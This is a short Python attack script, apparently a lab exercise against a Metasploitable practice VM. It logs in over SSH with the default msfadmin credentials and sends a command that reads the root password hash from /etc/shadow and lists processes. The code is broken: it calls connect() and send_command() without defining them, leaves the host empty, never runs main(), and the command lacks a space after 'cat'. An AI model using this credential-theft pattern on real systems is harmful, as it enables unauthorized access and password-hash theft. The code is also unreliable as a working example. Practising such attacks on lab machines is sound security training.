#!/usr/bin/python

import pexpect

#Author: Daniel Edwards
#Description: SSH & FTP attacks against metasploitable machine

def main():
	
	host =""
	user = "msfadmin"
	password = "msfadmin"
	child = connect(host,user,password)
	send_command(child, 'cat/etc/shadow | grep root;ps')


